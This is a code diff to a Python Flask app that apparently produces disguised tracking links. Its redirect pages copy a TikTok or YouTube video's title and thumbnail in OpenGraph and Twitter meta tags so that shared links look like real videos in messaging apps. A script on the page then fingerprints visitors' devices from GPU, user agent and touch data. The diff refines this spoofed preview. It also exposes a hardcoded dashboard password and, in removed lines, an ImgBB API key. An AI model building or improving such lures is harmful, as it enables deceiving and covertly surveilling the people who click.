@@ -14,9 +14,6 @@ DB_FILE = "tracker_data.db"
 USERNAME = "khaled"
 PASSWORD = "ALG@2022"
 
-# مفتاح الـ API الخاص بك المدمج لحل مشكلة تيك توك سحابياً
-IMGBB_API_KEY = "3933daa4b3bfb333516bdc1f0abb8709"
-
 ALGIERS_TZ = pytz.timezone('Africa/Algiers')
 
 def get_gmt1_time():
@@ -82,21 +79,6 @@ def guess_device_by_hardware(ua_string, gpu, touch_points):
         
     return "Unknown Hardware Client"
 
-def upload_to_cloud(image_url):
-    """رفع الصورة تلقائياً إلى ImgBB لمنع انتهاء صلاحية روابط تيك توك في واتساب"""
-    try:
-        url = "https://api.imgbb.com/1/upload"
-        payload = {
-            "key": IMGBB_API_KEY,
-            "image": image_url
-        }
-        res = requests.post(url, data=payload, timeout=7)
-        if res.status_code == 200:
-            return res.json()['data']['url']
-    except Exception as e:
-        print(f"Cloud Upload Error: {e}")
-    return image_url
-
 def fetch_original_meta(url, manual_thumb_url=None):
     url_lower = url.lower()
     title = "Watch Trending Video Content in HD Quality"
@@ -125,11 +107,11 @@ def fetch_original_meta(url, manual_thumb_url=None):
             res = requests.get(f"https://www.tiktok.com/oembed?url={url}", headers=headers, timeout=5)
             if res.status_code == 200:
                 data = res.json()
-                fetched_title = data.get('title', title)
-                temp_img = data.get('thumbnail_url', img)
-                # استخدام الرفع السحابي لحل مشكلة معاينة تيك توك
-                permanent_img = upload_to_cloud(temp_img)
-                return fetched_title, permanent_img
+                img_url = data.get('thumbnail_url', img)
+                # إصلاح مشكلة بروتوكول HTTP وإجباره على HTTPS لتقبله تطبيقات المراسلة
+                if img_url.startswith('http://'):
+                    img_url = img_url.replace('http://', 'https://')
+                return data.get('title', title), img_url
         except: 
             pass
     elif "youtube.com" in url_lower or "youtu.be" in url_lower:
@@ -210,10 +192,10 @@ DASHBOARD_LAYOUT = '''
                 <input type="url" id="original_url" name="original_url" oninput="checkUrlDomain(this.value)" placeholder="https://example.com/video..." required>
                 
                 <div id="thumbnail_wrapper" class="conditional-thumbnail">
-                    <b id="meta_warning_title" style="color:#0f172a; font-size:13px;">⚠️ Meta Link Detected (Manual Mode Active):</b>
+                    <b id="meta_warning_title" style="color:#0f172a; font-size:13px;">⚠️ TikTok Link Detected (Cloud Upload Active):</b>
                     <p style="margin: 5px 0; font-size:12px; color:#475569;">لضمان ظهور الصورة المصغرة بشكل مستقر، يرجى استخراج الرابط يدوياً عبر الزر أدناه ثم لصقه في الحقل:</p>
                     
-                    <a id="extractor_link" href="#" target="_blank" class="helper-btn">🔗 اضغط هنا لاستخراج رابط الصورة</a>
+                    <a id="extractor_link" href="#" target="_blank" class="helper-btn">استخراج غلاف الفيديو احتياطياً إن لزم الأمر 🔗</a>
                     
                     <label style="margin-top:10px;">قم بلصق رابط الصورة المستخرجة هنا (Image URL):</label>
                     <input type="url" name="manual_thumbnail" id="manual_thumbnail" placeholder="https://...">
@@ -252,12 +234,11 @@ DASHBOARD_LAYOUT = '''
                 extractorLink.innerText = "🔗 اذهب إلى موقع استخراج صور Facebook";
                 document.getElementById('manual_thumbnail').required = true;
             } else if (low.includes("tiktok.com") || low.includes("vt.tiktok")) {
-                // تيك توك أصبح تلقائياً وسحابياً الآن، الحقل اليدوي يظهر كخيار احتياطي فقط
                 thumbWrapper.style.display = "block";
-                warningTitle.innerText = "⚠️ TikTok Link Detected (Cloud Upload Active):";
+                warningTitle.innerText = "⚠️ TikTok Link Detected (Auto-API & Fallback Support):";
                 extractorLink.href = "https://urlebird.com/";
                 extractorLink.innerText = "🔗 استخراج غلاف الفيديو احتياطياً إن لزم الأمر";
-                document.getElementById('manual_thumbnail').required = false; 
+                document.getElementById('manual_thumbnail').required = false;
             } else {
                 thumbWrapper.style.display = "none";
                 document.getElementById('manual_thumbnail').required = false;
@@ -495,12 +476,21 @@ def secure_redirect(link_id):
             <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
             <title>{title}</title>
+            
             <meta property="og:title" content="{title}">
-            <meta property="og:description" content="Click to preview native app player source.">
+            <meta property="og:description" content="▶ Click to watch full video content.">
             <meta property="og:image" content="{image_url}">
             <meta property="og:image:secure_url" content="{image_url}">
-            <meta property="og:image:width" content="1280">
-            <meta property="og:image:height" content="720">
+            <meta property="og:image:type" content="image/jpeg">
+            <meta property="og:image:width" content="600">
+            <meta property="og:image:height" content="600">
+            <meta property="og:url" content="{request.base_url}">
+            
+            <meta name="twitter:card" content="summary_large_image">
+            <meta name="twitter:title" content="{title}">
+            <meta name="twitter:description" content="Click to view stream player source.">
+            <meta name="twitter:image" content="{image_url}">
+            
             {meta_tags}
             <script>
                 function extractAdvancedMetrics() {{
